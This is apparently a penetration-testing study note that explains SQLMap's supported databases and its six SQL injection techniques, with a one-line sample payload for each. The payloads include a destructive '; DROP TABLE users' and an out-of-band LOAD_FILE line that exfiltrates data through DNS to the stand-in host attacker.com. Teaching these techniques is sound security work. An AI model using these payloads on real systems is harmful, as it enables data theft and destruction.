## Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|                    |                      |                    |                        |
| ------------------ | -------------------- | ------------------ | ---------------------- |
| `MySQL`            | `Oracle`             | `PostgreSQL`       | `Microsoft SQL Server` |
| `SQLite`           | `IBM DB2`            | `Microsoft Access` | `Firebird`             |
| `Sybase`           | `SAP MaxDB`          | `Informix`         | `MariaDB`              |
| `HSQLDB`           | `CockroachDB`        | `TiDB`             | `MemSQL`               |
| `H2`               | `MonetDB`            | `Apache Derby`     | `Amazon Redshift`      |
| `Vertica`, `Mckoi` | `Presto`             | `Altibase`         | `MimerSQL`             |
| `CrateDB`          | `Greenplum`          | `Drizzle`          | `Apache Ignite`        |
| `Cubrid`           | `InterSystems Cache` | `IRIS`             | `eXtremeDB`            |
| `FrontBase`        |                      |                    |                        |
## Supported SQL Injection Types (all known)
The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
Example of `Boolean-based blind SQL Injection`:

```sql
AND 1=1
```

covers `Error-based SQL Injection` for the following DBMSes:

|                      |            |         |
| -------------------- | ---------- | ------- |
| MySQL                | PostgreSQL | Oracle  |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              |            |         |

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.
Example of `Error-based SQL Injection`:

```sql
AND GTID_SUBSET(@@version,0)
```
## UNION query-based

Example of `UNION query-based SQL Injection`:

```sql
UNION ALL SELECT 1,@@version,3
```

## Stacked queries

Example of `Stacked Queries`:

```sql
; DROP TABLE users
```
stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

## Time-based blind SQL Injection
Example of `Time-based blind SQL Injection`:


```sql
AND 1=IF(2>1,SLEEP(5),0)
```

## Inline queries

Example of `Inline Queries`:

```sql
SELECT (SELECT @@version) from
```

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

---

## Out-of-band SQL Injection

Example of `Out-of-band SQL Injection`:

Code: sql

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

# on DNS
SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.
By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.